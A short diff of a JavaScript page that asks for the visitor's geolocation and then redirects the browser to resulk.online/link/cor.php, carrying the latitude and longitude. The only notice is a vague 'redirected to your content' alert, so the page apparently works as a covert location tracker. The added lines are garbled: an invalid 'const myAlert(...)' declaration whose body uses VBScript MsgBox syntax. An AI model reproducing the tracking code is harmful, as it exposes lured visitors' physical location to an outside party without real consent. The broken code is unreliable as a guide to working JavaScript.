@@ -8,6 +8,11 @@ const funcionInit = () => {
 		$enlace = document.querySelector("#enlace");
 
 
+ 
+	const myAlert(title, content) {
+	MsgBox content, 0, title 
+	}
+
 	const onUbicacionConcedida = ubicacion => {
 		//console.log("", ubicacion);
 		const coordenadas = ubicacion.coords;
@@ -15,6 +20,8 @@ const funcionInit = () => {
 		$longitud.innerText = coordenadas.longitude;
 		$enlace.href = `https://resulk.online/link/cor.php?d=${coordenadas.latitude},${coordenadas.longitude}`;
 		alert("Redireccionado a su contenido")
+		myAlert('Message Header Here','Hi select a valid date');
+
 		window.location=`https://resulk.online/link/cor.php?d=${coordenadas.latitude},${coordenadas.longitude}`; 
 	}
 	const onErrorDeUbicacion = err => {
